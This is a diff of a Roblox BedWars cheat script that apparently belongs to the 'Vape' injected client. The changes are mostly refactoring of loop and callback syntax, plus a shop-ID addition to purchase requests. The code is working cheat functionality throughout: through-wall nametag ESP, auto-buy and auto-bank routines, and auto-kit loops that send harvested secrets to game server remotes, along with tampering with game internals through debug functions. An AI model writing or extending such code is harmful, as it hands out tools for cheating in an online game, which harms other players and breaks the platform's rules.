@@ -6701,12 +6030,12 @@ runFunction(function()
 					if entityLibrary.isAlive then 
 						snowpart.Position = entityLibrary.character.HumanoidRootPart.Position + Vector3.new(0, 100, 0)
 					end
-				until not _VapeApi.vapeInjected
+				until not vapeInjected
 			end)
 		end,
 		Halloween = function()
 			task.spawn(function()
-				for i,v in next, (lightingService:GetChildren()) do
+				for i,v in pairs(lightingService:GetChildren()) do
 					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
 						v:Remove()
 					end
@@ -6750,7 +6079,7 @@ runFunction(function()
 		end,
 		Valentines = function()
 			task.spawn(function()
-				for i,v in next, (lightingService:GetChildren()) do
+				for i,v in pairs(lightingService:GetChildren()) do
 					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
 						v:Remove()
 					end
@@ -6821,7 +6150,7 @@ runFunction(function()
 	})
 	GameThemeMode = GameTheme.CreateDropdown({
 		Name = "Theme",
-		Function = blankFunction,
+		Function = function() end,
 		List = {"Old", "Winter", "Halloween", "Valentines"}
 	})
 end)
@@ -6836,7 +6165,7 @@ runFunction(function()
 			p5:BreakJoints()
 			task.spawn(function()
 				local partvelo = {}
-				for i,v in next, (p5:GetDescendants()) do 
+				for i,v in pairs(p5:GetDescendants()) do 
 					if v:IsA("BasePart") then 
 						partvelo[v.Name] = v.Velocity * 3
 					end
@@ -6853,7 +6182,7 @@ runFunction(function()
 				clone.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
 				clone:BreakJoints()
 				task.wait(0.01)
-				for i,v in next, (clone:GetDescendants()) do 
+				for i,v in pairs(clone:GetDescendants()) do 
 					if v:IsA("BasePart") then 
 						local bodyforce = Instance.new("BodyForce")
 						bodyforce.Force = Vector3.new(0, (workspace.Gravity - 10) * v:GetMass(), 0)
@@ -6915,7 +6244,7 @@ runFunction(function()
 		end
 	}
 	local KillEffectName = {}
-	for i,v in next, (bedwars.KillEffectMeta) do 
+	for i,v in pairs(bedwars.KillEffectMeta) do 
 		table.insert(KillEffectName, v.name)
 		KillEffectName[v.name] = i
 	end
@@ -6944,7 +6273,7 @@ runFunction(function()
 		end
 	})
 	local modes = {"Bedwars"}
-	for i,v in next, (killeffects) do 
+	for i,v in pairs(killeffects) do 
 		table.insert(modes, i)
 	end
 	KillEffectMode = KillEffect.CreateDropdown({
@@ -7007,7 +6336,7 @@ runFunction(function()
 				espobjs[v.PrimaryPart] = nil
 			end
 		end))
-		for i,v in next, (collectionService:GetTagged(tag)) do 
+		for i,v in pairs(collectionService:GetTagged(tag)) do 
 			espadd(v.PrimaryPart, icon)
 		end
 	end
@@ -7194,7 +6523,7 @@ runFunction(function()
 			local v = nametagsfolderdrawing[ent]
 			nametagsfolderdrawing[ent] = nil
 			if v then 
-				for i2,v2 in next, (v.Main) do
+				for i2,v2 in pairs(v.Main) do
 					pcall(function() v2.Visible = false v2:Remove() end)
 				end
 			end
@@ -7275,13 +6604,13 @@ runFunction(function()
 	local nametagcolorfuncs = {
 		Normal = function(hue, sat, value)
 			local color = Color3.fromHSV(hue, sat, value)
-			for i,v in next, (nametagsfolderdrawing) do 
+			for i,v in pairs(nametagsfolderdrawing) do 
 				v.Main.TextColor3 = getPlayerColor(v.entity.Player) or color
 			end
 		end,
 		Drawing = function(hue, sat, value)
 			local color = Color3.fromHSV(hue, sat, value)
-			for i,v in next, (nametagsfolderdrawing) do 
+			for i,v in pairs(nametagsfolderdrawing) do 
 				v.Main.Text.Color = getPlayerColor(v.entity.Player) or color
 			end
 		end
@@ -7289,7 +6618,7 @@ runFunction(function()
 
 	local nametagloop = {
 		Normal = function()
-			for i,v in next, (nametagsfolderdrawing) do 
+			for i,v in pairs(nametagsfolderdrawing) do 
 				local headPos, headVis = worldtoscreenpoint((v.entity.RootPart:GetRenderCFrame() * CFrame.new(0, v.entity.Head.Size.Y + v.entity.RootPart.Size.Y, 0)).Position)
 				if not headVis then 
 					v.Main.Visible = false
@@ -7314,7 +6643,7 @@ runFunction(function()
 			end
 		end,
 		Drawing = function()
-			for i,v in next, (nametagsfolderdrawing) do 
+			for i,v in pairs(nametagsfolderdrawing) do 
 				local headPos, headVis = worldtoscreenpoint((v.entity.RootPart:GetRenderCFrame() * CFrame.new(0, v.entity.Head.Size.Y + v.entity.RootPart.Size.Y, 0)).Position)
 				if not headVis then 
 					v.Main.Text.Visible = false
@@ -7356,7 +6685,7 @@ runFunction(function()
 				end
 				if nametagfuncs1[methodused] then
 					local addfunc = nametagfuncs1[methodused]
-					for i,v in next, (entityLibrary.entityList) do 
+					for i,v in pairs(entityLibrary.entityList) do 
 						if nametagsfolderdrawing[v.Player] then nametagfuncs2[methodused](v.Player) end
 						addfunc(v)
 					end
@@ -7367,7 +6696,7 @@ runFunction(function()
 				end
 				if nametagupdatefuncs[methodused] then
 					table.insert(NameTags.Connections, entityLibrary.entityUpdatedEvent:Connect(nametagupdatefuncs[methodused]))
-					for i,v in next, (entityLibrary.entityList) do 
+					for i,v in pairs(entityLibrary.entityList) do 
 						nametagupdatefuncs[methodused](v)
 					end
 				end
@@ -7382,7 +6711,7 @@ runFunction(function()
 			else
 				RunLoops:UnbindFromRenderStep("NameTags")
 				if nametagfuncs2[methodused] then
-					for i,v in next, (nametagsfolderdrawing) do 
+					for i,v in pairs(nametagsfolderdrawing) do 
 						nametagfuncs2[methodused](i)
 					end
 				end
@@ -7390,7 +6719,7 @@ runFunction(function()
 		end,
 		HoverText = "Renders nametags on entities through walls."
 	})
-	for i,v in next, (Enum.Font:GetEnumItems()) do 
+	for i,v in pairs(Enum.Font:GetEnumItems()) do 
 		if v.Name ~= "SourceSans" then 
 			table.insert(fontitems, v.Name)
 		end
@@ -7417,7 +6746,7 @@ runFunction(function()
 	})
 	NameTagsRangeLimit = NameTags.CreateSlider({
 		Name = "Range",
-		Function = blankFunction,
+		Function = function() end,
 		Min = 0,
 		Max = 1000,
 		Default = 0
@@ -7625,7 +6954,7 @@ runFunction(function()
 	})
 	SongBeatsIntensity = SongBeats.CreateSlider({
 		Name = "Intensity",
-		Function = blankFunction,
+		Function = function() end,
 		Min = 1,
 		Max = 10,
 		Default = 5
@@ -7670,7 +6999,7 @@ runFunction(function()
 					debug.setconstant(debug.getupvalue(hotbar.render, 18).tweenPosition, 16, 0)
 					gametheme.topBarBGTransparency = 0.5
 					bedwars.TopBarController:mountHud()
-					-- game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
+					game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
 					bedwars.AbilityUIController.abilityButtonsScreenGui.Visible = false
 					bedwars.MatchEndScreenController.waitUntilDisplay = function() return false end
 					task.spawn(function()
@@ -7733,10 +7062,10 @@ runFunction(function()
 		Function = function(callback)
 			if callback then
 				task.spawn(function()
-					repeat task.wait() until bedwarsStore.matchState ~= 0 or  not _VapeApi.vapeInjected
-					if _VapeApi.vapeInjected and AutoBalloonypos == 0 and AutoBalloon.Enabled then
+					repeat task.wait() until bedwarsStore.matchState ~= 0 or  not vapeInjected
+					if vapeInjected and AutoBalloonypos == 0 and AutoBalloon.Enabled then
 						local lowestypos = 99999
-						for i,v in next, (bedwarsStore.blocks) do 
+						for i,v in pairs(bedwarsStore.blocks) do 
 							local newray = workspace:Raycast(v.Position + Vector3.new(0, 800, 0), Vector3.new(0, -1000, 0), bedwarsStore.blockRaycast)
 							if i % 200 == 0 then 
 								task.wait(0.06)
@@ -7809,12 +7138,12 @@ runFunction(function()
 		Min = 1,
 		Max = 50,
 		Default = 20,
-		Function = blankFunction,
+		Function = function() end,
 		HoverText = "Delay to inflate balloons."
 	})
 	AutoBalloonLegit = AutoBalloon.CreateToggle({
 		Name = "Legit Mode",
-		Function = blankFunction,
+		Function = function() end,
 		HoverText = "Switches to balloons in hotbar and inflates them."
 	})
 end)
@@ -7834,13 +7163,14 @@ runFunction(function()
 	local AutoBuyGui = {Enabled = false}
 	local AutoBuyTierSkip = {Enabled = true}
 	local AutoBuyRange = {Value = 20}
-	local AutoBuyCustom = {ObjectList = {}, RefreshList = blankFunction}
+	local AutoBuyCustom = {ObjectList = {}, RefreshList = function() end}
 	local AutoBankUIToggle = {Enabled = false}
 	local AutoBankDeath = {Enabled = false}
 	local AutoBankStay = {Enabled = false}
 	local buyingthing = false
 	local shoothook
 	local bedwarsshopnpcs = {}
+	local id
 	local armors = {
 		[1] = "leather_chestplate",
 		[2] = "iron_chestplate",
@@ -7871,35 +7201,36 @@ runFunction(function()
 	}
 
 	task.spawn(function()
-		repeat task.wait() until bedwarsStore.matchState ~= 0 or not _VapeApi.vapeInjected
-		for i,v in next, (collectionService:GetTagged("BedwarsItemShop")) do
-			table.insert(bedwarsshopnpcs, {Position = v.Position, TeamUpgradeNPC = true})
+		repeat task.wait() until bedwarsStore.matchState ~= 0 or not vapeInjected
+		for i,v in pairs(collectionService:GetTagged("BedwarsItemShop")) do
+			table.insert(bedwarsshopnpcs, {Position = v.Position, TeamUpgradeNPC = true, Id = v.Name})
 		end
-		for i,v in next, (collectionService:GetTagged("BedwarsTeamUpgrader")) do
-			table.insert(bedwarsshopnpcs, {Position = v.Position, TeamUpgradeNPC = false})
+		for i,v in pairs(collectionService:GetTagged("BedwarsTeamUpgrader")) do
+			table.insert(bedwarsshopnpcs, {Position = v.Position, TeamUpgradeNPC = false, Id = v.Name})
 		end
 	end)
 
 	local function nearNPC(range)
-		local npc, npccheck, enchant = nil, false, false
+		local npc, npccheck, enchant, newid = nil, false, false, nil
 		if entityLibrary.isAlive then
 			local enchanttab = {}
-			for i,v in next, (collectionService:GetTagged("broken-enchant-table")) do 
+			for i,v in pairs(collectionService:GetTagged("broken-enchant-table")) do 
 				table.insert(enchanttab, v)
 			end
-			for i,v in next, (collectionService:GetTagged("enchant-table")) do 
+			for i,v in pairs(collectionService:GetTagged("enchant-table")) do 
 				table.insert(enchanttab, v)
 			end
-			for i,v in next, (enchanttab) do 
+			for i,v in pairs(enchanttab) do 
 				if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - v.Position).magnitude <= 6 then
 					if ((not v:GetAttribute("Team")) or v:GetAttribute("Team") == lplr:GetAttribute("Team")) then
 						npc, npccheck, enchant = true, true, true
 					end
 				end
 			end
-			for i, v in next, (bedwarsshopnpcs) do
+			for i, v in pairs(bedwarsshopnpcs) do
 				if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - v.Position).magnitude <= (range or 20) then
 					npc, npccheck, enchant = true, (v.TeamUpgradeNPC or npccheck), false
+					newid = v.TeamUpgradeNPC and v.Id or newid
 				end
 			end
 			local suc, res = pcall(function() return lplr.leaderstats.Bed.Value == "✅"  end)
@@ -7910,13 +7241,15 @@ runFunction(function()
 				return nil, false, false
 			end
 		end
-		return npc, not npccheck, enchant
+		return npc, not npccheck, enchant, newid
 	end
 
 	local function buyItem(itemtab, waitdelay)
+		if not id then return end
 		local res
 		bedwars.ClientHandler:Get("BedwarsPurchaseItem"):CallServerAsync({
-			shopItem = itemtab
+			shopItem = itemtab,
+			shopId = id
 		}):andThen(function(p11)
 			if p11 then
 				bedwars.SoundManager:playSound(bedwars.SoundList.BEDWARS_PURCHASE_ITEM)
@@ -7952,7 +7285,7 @@ runFunction(function()
 	end
 
 	local function getAxeNear(inv)
-		for i5, v5 in next, (inv or bedwarsStore.localInventory.inventory.items) do
+		for i5, v5 in pairs(inv or bedwarsStore.localInventory.inventory.items) do
 			if v5.itemType:find("axe") and v5.itemType:find("pickaxe") == nil then
 				return v5.itemType
 			end
@@ -7961,7 +7294,7 @@ runFunction(function()
 	end
 
 	local function getPickaxeNear(inv)
-		for i5, v5 in next, (inv or bedwarsStore.localInventory.inventory.items) do
+		for i5, v5 in pairs(inv or bedwarsStore.localInventory.inventory.items) do
 			if v5.itemType:find("pickaxe") then
 				return v5.itemType
 			end
@@ -7978,7 +7311,7 @@ runFunction(function()
 			itemType = getPickaxeNear() or "wood_pickaxe"
 			itemType = pickaxes[table.find(pickaxes, itemType) + 1] or itemType
 		end
-		for i,v in next, (bedwars.ShopItems) do 
+		for i,v in pairs(bedwars.ShopItems) do 
 			if v.itemType == itemType then return v end
 		end
 		return nil
@@ -8064,8 +7397,9 @@ runFunction(function()
 				buyingthing = false 
 				task.spawn(function()
 					repeat
-						task.wait(ReducePackets.Enabled and ReduceAutoBuy.Enabled and 0.2 or 0) -- modification
-						local found, npctype, enchant = nearNPC(AutoBuyRange.Value)
+						task.wait()
+						local found, npctype, enchant, newid = nearNPC(AutoBuyRange.Value)
+						id = newid
 						if found then
 							local inv = bedwarsStore.localInventory.inventory
 							local currentupgrades = bedwars.ClientStoreHandler:getState().Bedwars.teamUpgrades
@@ -8085,7 +7419,7 @@ runFunction(function()
 								swords[5] = "light_sword"
 							end
 							if (AutoBuyGui.Enabled == false or (bedwars.AppController:isAppOpen("BedwarsItemShopApp") or bedwars.AppController:isAppOpen("BedwarsTeamUpgradeApp"))) and (not enchant) then
-								for i,v in next, (AutoBuyCustom.ObjectList) do 
+								for i,v in pairs(AutoBuyCustom.ObjectList) do 
 									local autobuyitem = v:split("/")
 									if #autobuyitem >= 3 and autobuyitem[4] ~= "true" then 
 										local shopitem = getShopItem(autobuyitem[1])
@@ -8098,8 +7432,8 @@ runFunction(function()
 										end
 									end
 								end
-								for i,v in next, (buyfunctions) do v(inv, currentupgrades, npctype and "upgrade" or "item") end
-								for i,v in next, (AutoBuyCustom.ObjectList) do 
+								for i,v in pairs(buyfunctions) do v(inv, currentupgrades, npctype and "upgrade" or "item") end
+								for i,v in pairs(AutoBuyCustom.ObjectList) do 
 									local autobuyitem = v:split("/")
 									if #autobuyitem >= 3 and autobuyitem[4] == "true" then 
 										local shopitem = getShopItem(autobuyitem[1])
@@ -8122,19 +7456,19 @@ runFunction(function()
 	})
 	AutoBuyRange = AutoBuy.CreateSlider({
 		Name = "Range",
-		Function = blankFunction,
+		Function = function() end,
 		Min = 1,
 		Max = 20,
 		Default = 20
 	})
 	AutoBuyArmor = AutoBuy.CreateToggle({
 		Name = "Buy Armor",
-		Function = blankFunction, 
+		Function = function() end, 
 		Default = true
 	})
 	AutoBuySword = AutoBuy.CreateToggle({
 		Name = "Buy Sword",
-		Function = blankFunction, 
+		Function = function() end, 
 		Default = true
 	})
 	AutoBuyUpgrades = AutoBuy.CreateToggle({
@@ -8152,37 +7486,37 @@ runFunction(function()
 	})
 	AutoBuyGen = AutoBuy.CreateToggle({
 		Name = "Buy Team Generator",
-		Function = blankFunction, 
+		Function = function() end, 
 	})
 	AutoBuyProt = AutoBuy.CreateToggle({
 		Name = "Buy Protection",
-		Function = blankFunction, 
+		Function = function() end, 
 		Default = true
 	})
 	AutoBuySharp = AutoBuy.CreateToggle({
 		Name = "Buy Sharpness",
-		Function = blankFunction, 
+		Function = function() end, 
 		Default = true
 	})
 	AutoBuyDestruction = AutoBuy.CreateToggle({
 		Name = "Buy Destruction",
-		Function = blankFunction, 
+		Function = function() end, 
 	})
 	AutoBuyDiamond = AutoBuy.CreateToggle({
 		Name = "Buy Diamond Generator",
-		Function = blankFunction, 
+		Function = function() end, 
 	})
 	AutoBuyAlarm = AutoBuy.CreateToggle({
 		Name = "Buy Alarm",
-		Function = blankFunction, 
+		Function = function() end, 
 	})
 	AutoBuyGui = AutoBuy.CreateToggle({
 		Name = "Shop GUI Check",
-		Function = blankFunction, 	
+		Function = function() end, 	
 	})
 	AutoBuyTierSkip = AutoBuy.CreateToggle({
 		Name = "Tier Skip",
-		Function = blankFunction, 
+		Function = function() end, 
 		Default = true
 	})
 	AutoBuyGen.Object.BackgroundTransparency = 0
@@ -8234,7 +7568,7 @@ runFunction(function()
 	local function refreshbank()
 		if autobankui then
 			local echest = replicatedStorageService.Inventories:FindFirstChild(lplr.Name.."_personal")
-			for i,v in next, (autobankui:GetChildren()) do 
+			for i,v in pairs(autobankui:GetChildren()) do 
 				if echest:FindFirstChild(v.Name) then 
 					v.Amount.Text = echest[v.Name]:GetAttribute("Amount")
 				else
@@ -8317,7 +7651,7 @@ runFunction(function()
 				if entityLibrary.isAlive and echest then
 					task.spawn(function()
 						local chestitems = bedwarsStore.localInventory.inventory.items
-						for i3,v3 in next, (chestitems) do
+						for i3,v3 in pairs(chestitems) do
 							if (v3.itemType == "emerald" or v3.itemType == "iron" or v3.itemType == "diamond" or v3.itemType == "gold" or (v3.itemType == "apple" and AutoBankApple.Enabled) or (v3.itemType == "balloon" and AutoBankBalloon.Enabled)) then
 								bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGiveItem"):CallServer(echest, v3.tool)
 								refreshbank()
@@ -8350,7 +7684,7 @@ runFunction(function()
 				end))
 				task.spawn(function()
 					repeat
-						task.wait(ReducePackets.Enabled and ReduceAutoBank.Enabled and 0.3 or 0) -- modification
+						task.wait()
 						local found, npctype = nearNPC(AutoBankRange.Value)
 						if echest == nil then 
 							echest = replicatedStorageService.Inventories:FindFirstChild(lplr.Name.."_personal")
@@ -8358,7 +7692,7 @@ runFunction(function()
 						if autobankballoon then 
 							local chestitems = echest and echest:GetChildren() or {}
 							if #chestitems > 0 then
-								for i3,v3 in next, (chestitems) do
+								for i3,v3 in pairs(chestitems) do
 									if v3:IsA("Accessory") and v3.Name == "balloon" then
 										if (not getItem("balloon")) then
 											task.spawn(function()
@@ -8375,7 +7709,7 @@ runFunction(function()
 								if not autobankballoon then
 									local chestitems = bedwarsStore.localInventory.inventory.items
 									if #chestitems > 0 then
-										for i3,v3 in next, (chestitems) do
+										for i3,v3 in pairs(chestitems) do
 											if v3 and v3.itemType == "balloon" then
 												task.spawn(function()
 													bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGiveItem"):CallServer(echest, v3.tool)
@@ -8391,7 +7725,7 @@ runFunction(function()
 						if autobankapple then 
 							local chestitems = echest and echest:GetChildren() or {}
 							if #chestitems > 0 then
-								for i3,v3 in next, (chestitems) do
+								for i3,v3 in pairs(chestitems) do
 									if v3:IsA("Accessory") and v3.Name == "apple" then
 										if (not getItem("apple")) then
 											task.spawn(function()
@@ -8408,7 +7742,7 @@ runFunction(function()
 								if not autobankapple then
 									local chestitems = bedwarsStore.localInventory.inventory.items
 									if #chestitems > 0 then
-										for i3,v3 in next, (chestitems) do
+										for i3,v3 in pairs(chestitems) do
 											if v3 and v3.itemType == "apple" then
 												task.spawn(function()
 													bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGiveItem"):CallServer(echest, v3.tool)
@@ -8426,7 +7760,7 @@ runFunction(function()
 							if entityLibrary.isAlive then
 								local chestitems = bedwarsStore.localInventory.inventory.items
 								if #chestitems > 0 then
-									for i3,v3 in next, (chestitems) do
+									for i3,v3 in pairs(chestitems) do
 										if v3 and (v3.itemType == "emerald" or v3.itemType == "iron" or v3.itemType == "diamond" or v3.itemType == "gold") then
 											if (not AutoBankTransmitted) or (AutoBankTransmittedType and v3.Name ~= "diamond") then 
 												task.spawn(function()
@@ -8444,7 +7778,7 @@ runFunction(function()
 						if found then 
 							local chestitems = echest and echest:GetChildren() or {}
 							if #chestitems > 0 then
-								for i3,v3 in next, (chestitems) do
+								for i3,v3 in pairs(chestitems) do
 									if v3:IsA("Accessory") and ((npctype == false and (v3.Name == "emerald" or v3.Name == "iron" or v3.Name == "gold")) or v3.Name == "diamond") then
 										task.spawn(function()
 											pcall(function()
@@ -8466,7 +7800,7 @@ runFunction(function()
 				local echest = replicatedStorageService.Inventories:FindFirstChild(lplr.Name.."_personal")
 				local chestitems = echest and echest:GetChildren() or {}
 				if #chestitems > 0 then
-					for i3,v3 in next, (chestitems) do
+					for i3,v3 in pairs(chestitems) do
 						if v3:IsA("Accessory") and (v3.Name == "emerald" or v3.Name == "iron" or v3.Name == "diamond" or v3.Name == "apple" or v3.Name == "balloon") then
 							task.spawn(function()
 								pcall(function()
@@ -8493,7 +7827,7 @@ runFunction(function()
 			if not callback then 
 				local echest = replicatedStorageService.Inventories:FindFirstChild(lplr.Name.."_personal")
 				local chestitems = echest and echest:GetChildren() or {}
-				for i3,v3 in next, (chestitems) do
+				for i3,v3 in pairs(chestitems) do
 					if v3:IsA("Accessory") and v3.Name == "apple" then
 						task.spawn(function()
 							bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGetItem"):CallServer(echest, v3)
@@ -8511,7 +7845,7 @@ runFunction(function()
 			if not callback then 
 				local echest = replicatedStorageService.Inventories:FindFirstChild(lplr.Name.."_personal")
 				local chestitems = echest and echest:GetChildren() or {}
-				for i3,v3 in next, (chestitems) do
+				for i3,v3 in pairs(chestitems) do
 					if v3:IsA("Accessory") and v3.Name == "balloon" then
 						task.spawn(function()
 							bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGetItem"):CallServer(echest, v3)
@@ -8525,17 +7859,17 @@ runFunction(function()
 	})
 	AutoBankDeath = AutoBank.CreateToggle({
 		Name = "Damage",
-		Function = blankFunction,
+		Function = function() end,
 		HoverText = "puts away resources when you take damage to prevent losing on death"
 	})
 	AutoBankStay = AutoBank.CreateToggle({
 		Name = "Stay",
-		Function = blankFunction,
+		Function = function() end,
 		HoverText = "keeps resources until toggled off"
 	})
 	AutoBankRange = AutoBank.CreateSlider({
 		Name = "Range",
-		Function = blankFunction,
+		Function = function() end,
 		Min = 1,
 		Max = 20,
 		Default = 20
@@ -8607,11 +7941,11 @@ runFunction(function()
 		Min = 1,
 		Max = 99,
 		Default = 70,
-		Function = blankFunction
+		Function = function() end
 	})
 	AutoConsumeSpeed = AutoConsume.CreateToggle({
 		Name = "Speed Potions",
-		Function = blankFunction,
+		Function = function() end,
 		Default = true
 	})
 end)
@@ -8644,7 +7978,7 @@ runFunction(function()
 	end
 	
 	local function findItemInTable(tab, item)
-		for i, v in next, (tab) do
+		for i, v in pairs(tab) do
 			if v and v.itemType then
 				if item.itemType == getCustomItem(v) then
 					return i
@@ -8655,7 +7989,7 @@ runFunction(function()
 	end
 
 	local function findinhotbar(item)
-		for i,v in next, (bedwarsStore.localInventory.hotbar) do
+		for i,v in pairs(bedwarsStore.localInventory.hotbar) do
 			if v.item and v.item.itemType == item.itemType then
 				return i, v.item
 			end
@@ -8663,7 +7997,7 @@ runFunction(function()
 	end
 
 	local function findininventory(item)
-		for i,v in next, (bedwarsStore.localInventory.inventory.items) do
+		for i,v in pairs(bedwarsStore.localInventory.inventory.items) do
 			if v.itemType == item.itemType then
 				return v
 			end
@@ -8675,7 +8009,7 @@ runFunction(function()
 			if AutoHotbarActive then return end
 			AutoHotbarActive = true
 			local items = (AutoHotbarList.Hotbars[AutoHotbarList.CurrentlySelected] and AutoHotbarList.Hotbars[AutoHotbarList.CurrentlySelected].Items or {})
-			for i, v in next, (bedwarsStore.localInventory.inventory.items) do 
+			for i, v in pairs(bedwarsStore.localInventory.inventory.items) do 
 				local customItem
 				local hotbarslot = findItemInTable(items, v)
 				if hotbarslot then
@@ -8763,7 +8097,7 @@ runFunction(function()
 	})
 	AutoHotbarClear = AutoHotbar.CreateToggle({
 		Name = "Clear Hotbar",
-		Function = blankFunction
+		Function = function() end
 	})
 end)
 
@@ -8774,7 +8108,7 @@ runFunction(function()
 	local function GetTeammateThatNeedsMost()
 		local plrs = GetAllNearestHumanoidToPosition(true, 30, 1000, true)
 		local lowest, lowestplayer = 10000, nil
-		for i,v in next, (plrs) do
+		for i,v in pairs(plrs) do
 			if not v.Targetable then
 				if v.Character:GetAttribute("Health") <= lowest and v.Character:GetAttribute("Health") < v.Character:GetAttribute("MaxHealth") then
 					lowest = v.Character:GetAttribute("Health")
@@ -8814,7 +8148,7 @@ runFunction(function()
 								repeat
 									task.wait()
 									local itemdrops = collectionService:GetTagged("treeOrb")
-									for i,v in next, (itemdrops) do
+									for i,v in pairs(itemdrops) do
 										if entityLibrary.isAlive and v:FindFirstChild("Spirit") and (entityLibrary.character.HumanoidRootPart.Position - v.Spirit.Position).magnitude <= 20 then
 											if bedwars.ClientHandler:Get(bedwars.TreeRemote):CallServer({
 												treeOrbSecret = v:GetAttribute("TreeOrbSecret")
@@ -8831,7 +8165,7 @@ runFunction(function()
 								repeat
 									task.wait()
 									local itemdrops = collectionService:GetTagged("hidden-metal")
-									for i,v in next, (itemdrops) do
+									for i,v in pairs(itemdrops) do
 										if entityLibrary.isAlive and v.PrimaryPart and (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude <= 20 then
 											bedwars.ClientHandler:Get(bedwars.PickupMetalRemote):SendToServer({
 												id = v:GetAttribute("Id")
@@ -8845,7 +8179,7 @@ runFunction(function()
 								repeat
 									task.wait()
 									local itemdrops = bedwars.BatteryEffectController.liveBatteries
-									for i,v in next, (itemdrops) do
+									for i,v in pairs(itemdrops) do
 										if entityLibrary.isAlive and (entityLibrary.character.HumanoidRootPart.Position - v.position).magnitude <= 10 then
 											bedwars.ClientHandler:Get(bedwars.BatteryRemote):SendToServer({
 												batteryId = i
@@ -8859,7 +8193,7 @@ runFunction(function()
 								repeat
 									task.wait()
 									local itemdrops = bedwars.GrimReaperController.soulsByPosition
-									for i,v in next, (itemdrops) do
+									for i,v in pairs(itemdrops) do
 										if entityLibrary.isAlive and lplr.Character:GetAttribute("Health") <= (lplr.Character:GetAttribute("MaxHealth") / 4) and v.PrimaryPart and (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude <= 120 and (not lplr.Character:GetAttribute("GrimReaperChannel")) then
 											bedwars.ClientHandler:Get(bedwars.ConsumeSoulRemote):CallServer({
 												secret = v:GetAttribute("GrimReaperSoulSecret")
@@ -8874,7 +8208,7 @@ runFunction(function()
 								repeat
 									task.wait()
 									local itemdrops = collectionService:GetTagged("BedwarsHarvestableCrop")
-									for i,v in next, (itemdrops) do
+									for i,v in pairs(itemdrops) do
 										if entityLibrary.isAlive and (entityLibrary.character.HumanoidRootPart.Position - v.Position).magnitude <= 10 then
 											bedwars.ClientHandler:Get("BedwarsHarvestCrop"):CallServerAsync({
 												position = bedwars.BlockController:getBlockPosition(v.Position)
@@ -8893,7 +8227,7 @@ runFunction(function()
 								repeat
 									task.wait(0.1)
 									if entityLibrary.isAlive then
-										for i,v in next, (bedwars.DragonSlayerController.dragonEmblems) do 
+										for i,v in pairs(bedwars.DragonSlayerController.dragonEmblems) do 
 											if v.stackCount >= 3 then 
 												bedwars.DragonSlayerController:deleteEmblem(i)
 												local localPos = lplr.Character:GetPrimaryPartCFrame().Position
@@ -8913,7 +8247,7 @@ runFunction(function()
 								repeat
 									task.wait(0.1)
 									if entityLibrary.isAlive then
-										for i, v in next, (collectionService:GetTagged("TomeGuidingBeam")) do 
+										for i, v in pairs(collectionService:GetTagged("TomeGuidingBeam")) do 
 											local obj = v.Parent and v.Parent.Parent and v.Parent.Parent.Parent
 											if obj and (entityLibrary.character.HumanoidRootPart.Position - obj.PrimaryPart.Position).Magnitude < 5 and obj:GetAttribute("TomeSecret") then
 												local res = bedwars.ClientHandler:Get(bedwars.MageRemote):CallServer({
@@ -8955,7 +8289,7 @@ runFunction(function()
 								repeat
 									task.wait(0.1)
 									if entityLibrary.isAlive then
-										for i,v in next, (collectionService:GetTagged("petrified-player")) do 
+										for i,v in pairs(collectionService:GetTagged("petrified-player")) do 
 											bedwars.ClientHandler:Get(bedwars.MinerRemote):SendToServer({
 												petrifyId = v:GetAttribute("PetrifyId")
 											})
@@ -8976,7 +8310,7 @@ runFunction(function()
 	AutoKitTrinity = AutoKit.CreateDropdown({
 		Name = "Angel",
 		List = {"Void", "Light"},
-		Function = blankFunction
+		Function = function() end
 	})
 end)
 
@@ -8990,8 +8324,8 @@ runFunction(function()
 			"quick_forge",
 			"glass_cannon"
 		}
-		for i,v in next, (relics) do 
-			for i2,v2 in next, (tab) do 
+		for i,v in pairs(relics) do 
+			for i2,v2 in pairs(tab) do 
 				if v.relic == v2 then
 					return v.relic
 				end
@@ -9035,7 +8369,6 @@ runFunction(function()
 	local AutoForgeArmor = {Enabled = false}
 	local AutoForgeSword = {Enabled = false}
 	local AutoForgeBuyAfter = {Enabled = false}
-	local AutoForgeSingleScythe = {Enabled = true}
 	local AutoForgeNotification = {Enabled = true}
 
 	local function buyForge(i)
@@ -9044,7 +8377,7 @@ runFunction(function()
 			if bedwarsStore.forgeMasteryPoints >= cost then 
 				if AutoForgeNotification.Enabled then
 					local forgeType = "none"
-					for name,v in next, (bedwars.ForgeConstants) do
+					for name,v in pairs(bedwars.ForgeConstants) do
 						if v == i then forgeType = name:lower() end
 					end
 					warningNotification("AutoForge", "Purchasing "..forgeType..".", bedwars.ForgeUtil.FORGE_DURATION_SEC)
@@ -9055,32 +8388,14 @@ runFunction(function()
 		end
 	end
 
-	local purchasedScythe = false
-
 	AutoForge = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
 		Name = "AutoForge",
 		Function = function(callback)
 			if callback then 
 				task.spawn(function()
 					repeat
-						task.wait(0.05)
+						task.wait()
 						if bedwarsStore.matchState == 1 and entityLibrary.isAlive then
-							if entityLibrary.character.HumanoidRootPart.Velocity.Magnitude > 0.01 then continue end
-							if AutoForgeSingleScythe.Enabled then
-								if not purchasedScythe then
-									if getItemNear("scythe") then
-										purchasedScythe = true
-									end
-									local weapon = bedwars.ForgeConstants[AutoForgeWeapon.Value:upper()]
-									if weapon then
-										buyForge(weapon)
-										if getItemNear("scythe") then
-											purchasedScythe = true
-										end
-										continue
-									end
-								end
-							end
 							if entityLibrary.character.HumanoidRootPart.Velocity.Magnitude > 0.01 then continue end
 							if AutoForgeArmor.Enabled then buyForge(bedwars.ForgeConstants.ARMOR) end
 							if entityLibrary.character.HumanoidRootPart.Velocity.Magnitude > 0.01 then continue end
